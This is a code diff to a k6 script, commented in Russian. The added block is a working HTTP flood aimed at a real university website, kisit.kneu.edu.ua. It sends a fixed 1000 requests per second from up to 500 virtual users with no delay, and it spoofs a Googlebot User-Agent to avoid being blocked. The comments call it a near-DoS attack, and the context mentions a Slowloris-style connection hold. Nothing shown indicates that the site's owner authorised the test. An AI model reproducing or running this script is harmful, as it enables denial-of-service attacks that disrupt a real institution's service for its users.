@@ -173,6 +173,42 @@ export default function () {
     // 2. Slowloris-эффект: держим соединение
     sleep(Math.random() * 5 + 2);
 }
+// Худшый уже подходим к Dos
+import http from 'k6/http';
+
+export const options = {
+    scenarios: {
+        // Жесткий флуд: генерируем фиксированное количество запросов в секунду (RPS)
+        // вне зависимости от того, успевает ли сервер отвечать.
+        http_flood: {
+            executor: 'constant-arrival-rate',
+            rate: 1000,             // 1000 запросов в секунду
+            timeUnit: '1s',
+            duration: '1m',
+            preAllocatedVUs: 100,    // Заранее выделяем потоки
+            maxVUs: 500,             // Потолок потоков, если сервер начнет тормозить
+        },
+    },
+};
+
+export default function () {
+    const url = 'https://www.kisit.kneu.edu.ua/';
+
+    // Убираем все лишнее. Нам нужна минимальная задержка на нашей стороне.
+    const params = {
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', // Маскировка под гугл-бота
+            'Connection': 'keep-alive',
+            'Accept-Encoding': 'gzip',
+        },
+        timeout: '5s', // Если сервер не ответил за 5 сек — бросаем его и шлем новый
+    };
+
+    // Бьем в тяжелую точку (например, главную со множеством скриптов или поиск)
+    http.get(url, params);
+
+    // ВНИМАНИЕ: Здесь НЕТ sleep(). Это бесконечный цикл запросов.
+}
 // Атаки выглядят так:
 //
 //     0 → 5000 RPS за 1 секунду
